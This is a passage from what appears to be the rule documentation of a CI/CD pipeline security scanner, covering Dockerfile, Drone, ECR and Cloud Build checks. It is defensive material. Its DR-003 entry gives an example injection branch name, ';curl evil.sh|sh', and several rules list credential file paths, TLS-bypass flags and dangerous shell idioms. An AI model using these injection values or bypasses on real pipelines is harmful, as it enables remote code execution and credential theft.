#### `DF-010`: apt-get dist-upgrade / upgrade pulls unknown package versions <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-010 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Running ``apt-get upgrade`` (or ``dist-upgrade``) inside a Dockerfile is the classic pet-vs-cattle anti-pattern. Two back-to-back builds with the same Dockerfile can produce different images because the upstream archive moved between the two ``RUN`` invocations. ``dist-upgrade`` additionally relaxes dependency resolution. It can install / remove arbitrary packages to satisfy upgrades, so the resulting image's package set isn't even bounded by what the Dockerfile declares.

**Recommendation.** Drop the upgrade step. Build on a recent base image instead (rebuild your image when the base image gets a security patch, pin the base by digest per DF-001 so the rebuild is deterministic). ``apt-get install pkg=<version>`` for specific packages stays reproducible; ``upgrade`` / ``dist-upgrade`` does not.

**Source:** [`DF-010`](../providers/dockerfile.md#df-010) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-016`: Image lacks OCI provenance labels <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-016 }

**Evidences:** [`SBOM`](#ctrl-sbom) Releases publish a software bill of materials.

**How this is detected.** The OCI image-spec annotation set is a small de facto standard maintained by the OCI working group. Only ``image.source`` and ``image.revision`` are checked because they're the two whose absence makes incident response materially harder; ``image.title`` / ``image.description`` are nice-to-have but the rule doesn't fire on those.

**Recommendation.** Add a ``LABEL`` line carrying at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). Most registries surface those fields in the UI and on ``manifest inspect``, which closes the source-to-image gap that GHA-006 / SLSA Build-L2 provenance attestation also addresses.

**Known false positives.**

- A multi-stage build's intermediate stages don't need provenance labels, only the final image ships. The rule fires per Dockerfile, not per stage; suppress for files where the final ``FROM`` is intentional throwaway scratch.

**Source:** [`DF-016`](../providers/dockerfile.md#df-016) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-019`: COPY/ADD source path looks like a credential file <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-019 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Fires on any ``COPY`` or ``ADD`` whose source basename is a well-known credential filename (``id_rsa``, ``.npmrc``, ``.netrc``, ``.env``, ``terraform.tfvars``, …) or whose path tail matches a canonical credential location (``.aws/credentials``, ``.docker/config.json``, ``.kube/config``). Files with private-key extensions (``.pem``, ``.key``, ``.p12``, ``.pfx``, ``.jks``) are also flagged. Globs are not expanded, the rule reads the literal source token.

**Recommendation.** Don't ``COPY`` credential files into an image. Anything baked into a layer is recoverable by anyone who can pull the image, even if a later step deletes the file. For build-time secrets (npm tokens, registry credentials, SSH deploy keys), use ``RUN --mount=type=secret,id=<name>`` so the value lives only for the duration of the step. For runtime secrets, mount them from the orchestrator (Kubernetes Secret, ECS task role, Vault sidecar) instead.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).

**Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Complements DF-006 (which flags an ENV/ARG with a literal credential-shaped value). This rule fires on the *name* alone, ``ARG NPM_TOKEN``, ``ARG GITHUB_PAT``, ``ARG DB_PASSWORD``, even when no default is set, because BuildKit records the resolved value in the image's history the moment ``--build-arg`` supplies one. Names are matched via the same ``_primitives/secret_shapes`` regex used by the other secret-name rules.

**Recommendation.** Don't pass secrets through ``ARG``. Build arguments are recorded in ``docker history`` whether the value comes from a default or from ``--build-arg`` at build time, so a credential-named ARG leaks the secret to anyone who can pull the image. Use ``RUN --mount=type=secret,id=<name>`` and feed the value with BuildKit's ``--secret`` flag, the secret never lands in a layer or in the build history.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.

**Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DR-001`: Step image not pinned to a digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection mirrors the GL-001 / JF-009 / ADO-009 / CC-003 family: any container ``image:`` whose ref doesn't end in ``@sha256:<64 hex>`` fires. ``:latest`` and missing-tag references emit the strongest message; a specific-version tag (``golang:1.21.5``) still fires but can be fixed with a one-line digest swap. The rule scopes itself to ``type: docker`` / ``kubernetes`` pipelines (the container-flavored ones); ``ssh`` / ``exec`` / ``digitalocean`` pipelines have no ``image:`` field and pass-by-default.

**Recommendation.** Pin every step ``image:`` (and every ``services:`` image) to ``@sha256:<digest>``. Drone resolves the image ref at run time, so a tag like ``golang:1.21`` resolves against whatever the registry currently serves and a compromised registry can swap content under a fixed tag. Capture the digest once with ``docker buildx imagetools inspect golang:1.21`` (or ``crane digest golang:1.21``) and update the digest deliberately when the upstream version moves.

**Known false positives.**

- Local-build images (``image: my-org/build-tools:dev`` produced upstream in the same pipeline) sometimes can't be digest-pinned because the digest depends on the build. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the floating-tag risk still applies to every public-registry pull.

**Source:** [`DR-001`](../providers/drone.md#dr-001) in the [Drone CI provider](../providers/drone.md).

#### `DR-002`: Step runs with privileged: true <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-002 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Drone's ``privileged: true`` is a step-scoped switch that maps directly to ``docker run --privileged``. The rule fires on either steps or services declaring the flag. The agent admin can also globally allow / deny privileged steps via the trusted-flag on the repository, the rule doesn't try to reach into Drone's server config and assumes the worst (a malicious or accidentally-trusted repo) so a ``privileged: true`` in source is always a finding.

**Recommendation.** Drop ``privileged: true`` from the step. The flag removes the container's syscall and capability boundary, giving the step kernel-level access to the agent host. Most workloads that reach for it are Docker-in-Docker pipelines that can use a rootless alternative (``buildx``, ``kaniko``, ``buildah --isolation=chroot``) instead. If the workload genuinely needs syscalls, scope down with explicit ``cap_add: [SYS_ADMIN]`` and an isolated runner pool, rather than blanket privileged.

**Source:** [`DR-002`](../providers/drone.md#dr-002) in the [Drone CI provider](../providers/drone.md).

#### `DR-003`: Untrusted Drone template variable in shell command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-003 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** User-controllable substitution sources flagged by this rule:

- ``DRONE_COMMIT_MESSAGE`` / ``DRONE_COMMIT_AUTHOR*``
- ``DRONE_PULL_REQUEST_TITLE`` / ``DRONE_PULL_REQUEST_BRANCH``
- ``DRONE_TAG_MESSAGE`` (tag annotations are author-controlled)
- ``DRONE_BRANCH`` / ``DRONE_SOURCE_BRANCH`` / ``DRONE_TARGET_BRANCH`` (branch names are pushable, so an attacker can craft a name like ``;curl evil.sh|sh``)
- ``DRONE_REPO_*`` (in fork PRs the repo metadata comes from the fork)

The rule only fires on **unquoted** uses inside a command body. Quoted (``"${DRONE_*}"``) or single-quoted uses are safe in POSIX shell because the substitution runs after Drone's templating but the shell still tokenises the expanded value as a single argument. Same model as the Tekton TKN-003 / Argo ARGO-005 / Buildkite BK-003 rules in this catalog.

**Recommendation.** Treat user-controllable Drone template variables as tainted. Drone substitutes ``${DRONE_*}`` tokens *before* the shell parses the command, so an unquoted use is a textbook command-injection primitive. The safe pattern is to copy the value into the step's ``environment:`` block (``MSG: ${DRONE_PULL_REQUEST_TITLE}``) and reference the env var quoted in the command (``echo "$MSG"``). Drone's own docs call out the same hardening for build-message / commit-author fields.

**Known false positives.**

- Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, ``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for non-fork repos) aren't user-controllable and are safe to interpolate unquoted. Drone-template syntax can also appear in YAML strings outside ``commands:``; this rule only scopes itself to step command bodies, so an unquoted use in (say) ``settings.message:`` doesn't fire here, those land under DR-004 / SBOM-style audits.

**Source:** [`DR-003`](../providers/drone.md#dr-003) in the [Drone CI provider](../providers/drone.md).

#### `DR-005`: Plugin step uses a floating image tag <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-005 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Drone treats a step as a plugin when it has a ``settings:`` block. The ``image:`` field still names the container that runs, and the same supply-chain argument as DR-001 applies; this rule fires specifically on plugin steps using a floating tag (``:latest``, no tag, or a non-version-shaped tag) rather than every unpinned image, so a maintainer weighing trade-offs can ratchet plugin pinning up first. A pinned-version tag (``plugins/docker:20.13.0``) passes this rule but still trips DR-001 for the wider supply-chain hardening.

**Recommendation.** Pin every plugin step's ``image:`` to ``@sha256:<digest>`` or, at minimum, a specific version tag (``plugins/docker:20.13.0`` rather than ``plugins/docker:latest`` or ``plugins/docker``). Plugin steps are a sharper attack surface than ordinary steps because Drone passes every ``settings:`` key to the plugin as an environment variable, including any secret references; a malicious plugin replacement can exfiltrate the entire credential set the step was trusted with.

**Known false positives.**

- Internal-registry plugins built and pushed by the same pipeline (``image: my-org/internal-plugin:dev`` produced upstream) sometimes can't be exact-pinned. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape.

**Source:** [`DR-005`](../providers/drone.md#dr-005) in the [Drone CI provider](../providers/drone.md).

#### `DR-006`: TLS verification disabled in step commands <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-006 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection), [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection is the same blob-regex used by GHA-027, BK-008, JF-022, ADO-026, CC-024, and the CFN/Terraform rule packs. Matches: ``curl --insecure`` / ``-k``, ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, ``yarn config set strict-ssl false``, ``git config http.sslverify false``, ``GIT_SSL_NO_VERIFY=1``, ``NODE_TLS_REJECT_UNAUTHORIZED=0``, ``PYTHONHTTPSVERIFY=0``, and ``GOINSECURE=...``. The rule scans every ``commands:`` entry on every step.

**Recommendation.** Remove TLS-bypass flags from build commands. The most common offenders are ``curl --insecure`` / ``-k`` / ``wget --no-check-certificate``, ``pip config set global.trusted-host``, ``npm config set strict-ssl false``, and ``git -c http.sslverify=false``. Each exposes the build to TLS-MITM injection of a registry-served payload, which is a textbook supply-chain attack vector. If a registry's certificate is genuinely broken, fix the registry rather than permanently disabling verification, the bypass tends to outlive the broken cert and become a permanent weakness.

**Source:** [`DR-006`](../providers/drone.md#dr-006) in the [Drone CI provider](../providers/drone.md).

#### `DR-007`: Step mounts a sensitive host path <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-007 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Drone's pipeline-level ``volumes:`` block accepts either ``temp:`` (an ephemeral tmpfs, safe) or ``host: { path: ... }`` (a bind mount of the agent's filesystem, the dangerous shape). The rule fires when any pipeline-level volume's ``host.path`` matches a sensitive prefix:

- ``/var/run/docker.sock`` — the canonical Docker-in-Docker escape; equivalent to ``--privileged`` for container takeover purposes;
- ``/var/lib/docker`` — exposes every image / container on the host;
- ``/etc`` — config + credential files;
- ``/proc`` / ``/sys`` — host kernel state;
- ``/`` — full host takeover.

The rule fires on the volume *declaration*, not on step-level mounts. A pipeline that declares a sensitive host volume but no step actually mounts it is still flagged: the declaration alone signals the agent's Drone runner is configured to permit the bind mount, which is itself a risk-shape decision worth review.

**Recommendation.** Drop the host volume from the pipeline. Mounting ``/var/run/docker.sock`` from the agent host into a build container hands the container root-equivalent control over every other workload on the same agent (it can spawn arbitrary containers, including privileged ones). ``/var/lib/docker`` exposes every image and container on the host, ``/proc`` and ``/sys`` expose the host kernel state, and ``/`` (the host root) is full takeover. If the build genuinely needs Docker, run a rootless alternative (``kaniko``, ``buildah --isolation=chroot``, ``docker buildx`` against a remote builder) or use Drone's ``trusted: true`` repo flag plus a dedicated host-isolated runner pool, rather than mounting the shared host's socket.

**Known false positives.**

- Trusted-only pipelines on a dedicated runner fleet (no fork-PR access, no untrusted contributors) sometimes deliberately mount the Docker socket for image build / push workflows. Suppress via ignore-file when this is the deliberate posture and the runner pool's isolation is documented elsewhere; the rule has no way to know whether ``trusted: true`` is set on the repo from the pipeline YAML alone.

**Source:** [`DR-007`](../providers/drone.md#dr-007) in the [Drone CI provider](../providers/drone.md).

#### `DR-008`: Step uses ``pull: never`` (skips registry verification) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-dr-008 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Drone supports three ``pull:`` policies on a step: ``always`` (re-fetch + verify on every build, the default), ``if-not-exists`` (use cache when present, otherwise pull), and ``never`` (use cache only). The ``never`` policy is the dangerous one because it skips the digest verification an ``always`` pull would perform, and there's no out-of-band signal that the cached image is the one the manifest names. The rule fires on either steps or services declaring ``pull: never``. ``pull: if-not-exists`` is treated as acceptable: it's tolerable when paired with a digest-pinned ``image:`` (DR-001) and a deliberate operational decision; the explicit-skip case (``never``) is what TAINT-class supply-chain attacks lean on.

**Recommendation.** Drop the ``pull: never`` directive (or change it to ``pull: always`` / ``pull: if-not-exists``). ``pull: never`` tells the Drone agent to skip the registry round-trip entirely, so the agent runs whatever image bytes it cached on a previous build without re-verifying the digest. If a compromised image ever landed in the agent's local cache (a poisoned registry tag, a manual ``docker pull`` during a debug session, a co-resident workload that pulled a malicious image), the cached bytes keep running until an operator manually clears the cache. ``pull: always`` (the Drone default) re-fetches and verifies on every build; ``pull: if-not-exists`` is acceptable when the image is digest-pinned (DR-001) so the cache key is content-addressed.

**Known false positives.**

- Air-gapped or registry-pinned environments sometimes set ``pull: never`` deliberately because the agent never has registry access in the first place. Suppress via ignore-file when this is the deliberate shape; the runner's network isolation then carries the integrity guarantee instead of the registry round-trip.

**Source:** [`DR-008`](../providers/drone.md#dr-008) in the [Drone CI provider](../providers/drone.md).

#### `DR-009`: Cache plugin key embeds an attacker-controllable Drone variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-009 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Drone has no first-party cache keyword; pipelines use plugin steps (``drone-cache``, ``drone-volume-cache``, ``drone-s3-cache``, etc.) configured via ``settings:``. The rule fires on any plugin step whose ``settings.cache_key`` (or related ``key``, ``mount``, ``filename``, ``restore_keys``) interpolates a tainted Drone variable. Tainted vocabulary mirrors DR-003: ``$DRONE_BRANCH``, ``$DRONE_PULL_REQUEST*``, ``$DRONE_COMMIT_*MESSAGE``, ``$DRONE_TAG_MESSAGE``, and the fork-PR-shaped ``$DRONE_REPO_*`` family. The attack model is well-documented (GHA-011 catches the same shape on the GitHub Actions side).

**Recommendation.** Don't embed PR-controlled or branch-controlled Drone variables in cache keys. The canonical safe shape is to key on commit-stable inputs only: a checksum of the lockfile (``${DRONE_REPO_BRANCH}-${DRONE_COMMIT_SHA}`` is unique enough; ``${DRONE_BRANCH}`` alone is attacker-controllable). When two builds need to share a cache, key on the dependency manifest's hash, not on any branch / PR / repo metadata that a fork PR can shape. If a fork PR's cache write can ever be read back by a trusted-context build (the same key on a different branch), the attacker can inject malicious build artifacts into the trusted run.

**Known false positives.**

- Plugins that namespace cache reads by branch on the *write* side and never read across branches (a deliberate cache partitioning) are technically safe, the attacker can poison their own branch's cache but can't reach the trusted-branch one. The rule has no way to verify partition boundaries at scan time; suppress via ignore-file scoped to the specific step name when the partitioning is audited.

**Source:** [`DR-009`](../providers/drone.md#dr-009) in the [Drone CI provider](../providers/drone.md).

#### `DR-010`: Step commands run unpinned package installs <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-dr-010 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Detection reuses the cross-provider primitives ``PKG_INSECURE_RE`` and ``PKG_NO_LOCKFILE_RE`` from ``checks/base.py``. The same rule pack already exists for GHA (``GHA-021`` / ``GHA-022``), GitLab (``GL-021`` / ``GL-022``), Bitbucket / Azure DevOps / Jenkins / CircleCI / Cloud Build / Buildkite / Tekton / Argo. Drone was the missing port; this closes the gap.

Insecure variants matched (``PKG_INSECURE_RE``): ``pip --index-url http://``, ``pip --trusted-host``, ``npm --registry http://``, ``gem --source http://``, ``nuget --Source http://``, ``cargo --index http://``. Lockfile-bypass variants (``PKG_NO_LOCKFILE_RE``): ``npm install`` (should be ``npm ci``), bare ``pip install <pkg>`` without ``-r`` or ``--require-hashes``, ``yarn install`` without ``--frozen-lockfile``, ``bundle install`` without ``--frozen``, ``cargo install``, ``go install`` without an ``@vN.N`` pin, ``poetry install`` without ``--no-update``.

**Recommendation.** Pin every package install to a lockfile or a checksum-verified version. For pip, use ``pip install --require-hashes -r requirements.txt`` or ``-r requirements.txt`` with hashes baked into the lock; ``pip install <package>`` without a version pin or lockfile flag is the unsafe shape. For npm, prefer ``npm ci`` over ``npm install`` so the lockfile is load-bearing. Yarn: ``yarn install --frozen-lockfile``. Bundle: ``bundle install --frozen``. Cargo / go install: always pin to a tag or commit. Do NOT use ``--trusted-host`` / ``--no-verify`` / a non-HTTPS index URL — those bypass TLS or trust validation entirely (DR-006 covers the TLS subset; this rule covers the lockfile subset).

**Known false positives.**

- Bootstrap-stage installs that intentionally pull latest (``apt-get install -y curl`` for a tooling image rebuild) sometimes legitimately bypass the lockfile. Suppress via ignore-file scoped to the specific step name when this is the deliberate shape; the broader pinning policy still covers the rest of the pipeline.

**Source:** [`DR-010`](../providers/drone.md#dr-010) in the [Drone CI provider](../providers/drone.md).

#### `DR-011`: node map interpolates attacker-controllable Drone variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-dr-011 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Drone substitutes ``${VAR}`` template tokens against the build context before the runner picks an agent. The rule walks the pipeline-level ``node:`` map (Drone doesn't expose a per-step variant) for any reference to the same author-controllable variables DR-003 tracks (``DRONE_BRANCH``, ``DRONE_TAG``, ``DRONE_PULL_REQUEST_*``, ``DRONE_COMMIT_AUTHOR*``, ``DRONE_COMMIT_MESSAGE``, ``DRONE_REPO``).

Detection is value-only and case-sensitive against the documented variable names; trusted server-controlled fields like ``DRONE_BUILD_NUMBER`` and ``DRONE_REPO_NAMESPACE`` (for non-fork repos) aren't on the tainted list. Closes parity with BK-015 / GHA-036 / GL-032 / JF-032 / ADO-030 / CC-031.

**Recommendation.** Pin every ``node:`` map entry to a static literal that matches your runner-targeting policy. Drone uses ``node:`` to route a pipeline to runners with matching labels (e.g. ``node: { instance: ci-prod-amd64 }``). When the map value interpolates ``${DRONE_BRANCH}`` / ``${DRONE_PULL_REQUEST_*}`` / ``${DRONE_COMMIT_AUTHOR}``, the pusher gets to pick which runner pool runs the pipeline, including a privileged pool reserved for the deploy step. Production runner pools should also carry a label the agent itself enforces (the runner's ``DRONE_RUNNER_LABELS`` env var, plus a server-side policy on which repos can target which labels) so the rule is one layer of defense-in-depth.

**Known false positives.**

- Some teams use a static prefix plus a CI-controlled tail (``node: { pool: build-${DRONE_REPO_NAME} }``) to share a runner pool across repos. ``DRONE_REPO_NAME`` is set by the server, not the pusher, so it isn't on the tainted list, but if your team has its own conventions for trusted Drone vars, suppress on the specific pipeline name.

**Source:** [`DR-011`](../providers/drone.md#dr-011) in the [Drone CI provider](../providers/drone.md).

#### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.

**Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.

**Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }

**Evidences:** [`Signed-Releases`](#ctrl-signed-releases) Release artifacts are cryptographically signed.

**How this is detected.** Same shape as CP-002 / CWL-002 / CCM-002: AES256 (the AWS-managed default) gives confidentiality at rest but no key-policy or CloudTrail Decrypt-event story. Container images are arguably sensitive intellectual property, the same key-policy + audit shape as build outputs in S3 is warranted.

**Recommendation.** Set encryptionType=KMS with a customer-managed key ARN.

**Source:** [`ECR-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-006`: ECR pull-through cache rule uses an untrusted upstream <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-006 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.

**Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.

**Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }

**Evidences:** [`SAST`](#ctrl-sast) Project uses static analysis / vulnerability scanning, [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** ECR-001's basic on-push scan covers OS-level packages, apt / yum / apk lineage. Most production CVE risk is in language ecosystems (npm, pip, gem, mvn) which the basic scanner ignores. Inspector v2 enhanced scanning closes that gap and runs continuously, so a CVE published two weeks after a build still surfaces against the deployed image.

**Recommendation.** Enable Amazon Inspector v2 for the ``ECR`` scan type on this account. Basic ECR scanning on-push only covers OS packages; Inspector v2 enhanced scanning adds language-ecosystem CVEs and runs continuously as new vulnerabilities are published.

**Source:** [`ECR-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `GCB-001`: Cloud Build step image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-001 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Bare references (``gcr.io/cloud-builders/docker``) are treated as ``:latest`` by Cloud Build. Tag-only references (``:20``, ``:latest``) count as unpinned. Only ``@sha256:…`` suffixes pass.

**Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.

**Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.

**Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-003`: Secret Manager value referenced in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-003 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Detection patterns: literal ``projects/<n>/secrets/<name>/versions/...`` URIs, ``gcloud secrets versions access`` shell invocations, and ``$(gcloud secrets …)`` command substitutions in step args or entrypoint.

**Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.

**Known false positives.**

- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.

**Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.

**Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.

**Known false positives.**

- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.

**Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-006`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-006 }

**Evidences:** [`Dangerous-Workflow`](#ctrl-dangerous-workflow) No dangerous patterns in CI workflows (untrusted checkout, script injection).

**How this is detected.** Complements GCB-004 (dynamicSubstitutions + user substitution in args). GCB-006 fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the substitution source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary. In Cloud Build these idioms typically appear in ``args: [-c, ...]`` entries under a bash entrypoint.

**Known false positives.**

